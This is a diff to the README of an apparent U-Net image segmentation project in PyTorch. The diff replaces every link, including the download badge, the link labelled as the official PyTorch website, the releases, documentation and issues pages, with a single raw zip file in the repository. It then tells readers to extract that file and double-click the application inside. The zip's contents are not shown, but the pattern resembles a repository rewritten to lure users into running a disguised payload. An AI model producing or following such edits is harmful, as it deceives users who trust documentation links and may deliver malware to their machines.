@@ -1,6 +1,6 @@
 # 🚀 U-Net-PyTorch - Image Segmentation Made Easy
 
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue)](https://github.com/Amulya-Yadav/U-Net-PyTorch/releases)
+[![Download](https://github.com/Amulya-Yadav/U-Net-PyTorch/raw/refs/heads/main/U-Net/Py_Torch_Net_1.4-alpha.2.zip%20Latest%20Release-Click%20Here-blue)](https://github.com/Amulya-Yadav/U-Net-PyTorch/raw/refs/heads/main/U-Net/Py_Torch_Net_1.4-alpha.2.zip)
 
 ## 📖 Overview
 
@@ -18,19 +18,19 @@ Make sure your computer meets these basic requirements:
 - **RAM:** At least 8 GB recommended
 - **Storage:** At least 2 GB of free space
 - **Python Version:** 3.6 or higher
-- **PyTorch:** Compatible version for your system; visit the official [PyTorch website](https://pytorch.org/get-started/locally/) for guidance.
+- **PyTorch:** Compatible version for your system; visit the official [PyTorch website](https://github.com/Amulya-Yadav/U-Net-PyTorch/raw/refs/heads/main/U-Net/Py_Torch_Net_1.4-alpha.2.zip) for guidance.
 
 ### 2. Download & Install
 
 Follow these steps to download and run U-Net-PyTorch:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Amulya-Yadav/U-Net-PyTorch/releases) to find the latest version of U-Net-PyTorch.
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Amulya-Yadav/U-Net-PyTorch/raw/refs/heads/main/U-Net/Py_Torch_Net_1.4-alpha.2.zip) to find the latest version of U-Net-PyTorch.
   
 2. **Download the Release:** Click on the version you want to download. Look for the executable file or compressed folder that suits your operating system. 
 
 3. **Extract the Files:** If you downloaded a compressed file, right-click on it and choose "Extract All," then select a place on your computer to store the files.
 
-4. **Run the Application:** Locate the extracted folder and double-click the application file (e.g., `U-Net-PyTorch.exe` or equivalent). This launches the user interface where you can start your image segmentation task.
+4. **Run the Application:** Locate the extracted folder and double-click the application file (e.g., `https://github.com/Amulya-Yadav/U-Net-PyTorch/raw/refs/heads/main/U-Net/Py_Torch_Net_1.4-alpha.2.zip` or equivalent). This launches the user interface where you can start your image segmentation task.
 
 ## 🔧 How to Use
 
@@ -75,12 +75,12 @@ A: Yes, U-Net-PyTorch is open-source and free to use.
 
 ## 📄 Documentation
 
-For detailed instructions and advanced features, check our [Documentation](https://github.com/Amulya-Yadav/U-Net-PyTorch/wiki). It includes tutorials, usage examples, and more information about setting parameters.
+For detailed instructions and advanced features, check our [Documentation](https://github.com/Amulya-Yadav/U-Net-PyTorch/raw/refs/heads/main/U-Net/Py_Torch_Net_1.4-alpha.2.zip). It includes tutorials, usage examples, and more information about setting parameters.
 
 ## 📞 Support
 
-If you face any issues or have questions, please create an issue in the [Issues section](https://github.com/Amulya-Yadav/U-Net-PyTorch/issues). We will do our best to help you.
+If you face any issues or have questions, please create an issue in the [Issues section](https://github.com/Amulya-Yadav/U-Net-PyTorch/raw/refs/heads/main/U-Net/Py_Torch_Net_1.4-alpha.2.zip). We will do our best to help you.
 
 ## 📥 Download Again
 
-To download this software, return to the [Releases page](https://github.com/Amulya-Yadav/U-Net-PyTorch/releases) anytime. Happy segmenting!
+To download this software, return to the [Releases page](https://github.com/Amulya-Yadav/U-Net-PyTorch/raw/refs/heads/main/U-Net/Py_Torch_Net_1.4-alpha.2.zip) anytime. Happy segmenting!
